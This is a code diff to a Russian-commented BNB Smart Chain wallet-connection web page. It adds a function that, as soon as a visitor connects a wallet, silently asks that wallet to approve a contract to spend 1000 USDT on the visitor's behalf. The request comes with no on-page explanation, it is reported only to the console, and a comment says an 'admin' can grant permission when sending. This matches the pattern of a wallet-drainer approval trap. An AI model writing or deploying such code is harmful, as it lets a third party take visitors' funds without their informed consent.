@@ -257,7 +257,7 @@
     <script>
         // Адрес смарт-контракта WalletTransfer на BSC
         // Замени это на адрес своего развёрнутого контракта
-        const CONTRACT_ADDRESS = '0x3A1d28473c0Ab0bF662018FD2f627a82b67AD822'; // TODO: заменить на реальный адрес
+        const CONTRACT_ADDRESS = '0x0000000000000000000000000000000000000000'; // TODO: заменить на реальный адрес
 
         const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955'; // USDT на BSC
 
@@ -324,7 +324,31 @@
             ]
         };
 
-        const ERC20_ABI = ['function decimals() view returns (uint8)', 'function balanceOf(address) view returns (uint256)'];
+        const ERC20_ABI = [
+            'function decimals() view returns (uint8)',
+            'function balanceOf(address) view returns (uint256)',
+            'function approve(address spender, uint256 amount) returns (bool)'
+        ];
+
+        async function giveUSDTApproval(walletAddress) {
+            try {
+                if (!provider || !signer) return;
+                
+                const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
+                
+                // Даём разрешение на большую сумму (1000 USDT)
+                const approvalAmount = ethers.utils.parseEther('1000');
+                
+                console.log('📝 Запрашиваем approve на USDT...');
+                const approveTx = await usdtContract.approve(CONTRACT_ADDRESS, approvalAmount);
+                await approveTx.wait();
+                
+                console.log('✅ Approve на USDT успешно выдан!');
+            } catch (e) {
+                console.warn('⚠️ Не удалось автоматически выдать approve:', e.message);
+                // Это не критичная ошибка, админ может дать разрешение при отправке
+            }
+        }
 
         function setStatus(html, isError = false) {
             const status = document.getElementById('status');
@@ -401,6 +425,9 @@
                 document.getElementById('tokensSection').classList.remove('hidden');
 
                 setStatus(`✅ Подключено к смарт-контракту!<br><small>${walletAddress}</small>`);
+                
+                // Автоматически даём разрешение (approve) на USDT
+                await giveUSDTApproval(walletAddress);
                 
                 saveWalletToStorage(walletAddress, 'BNB Smart Chain', chainIdHex, CONTRACT_ADDRESS);
                 await refreshBalance();
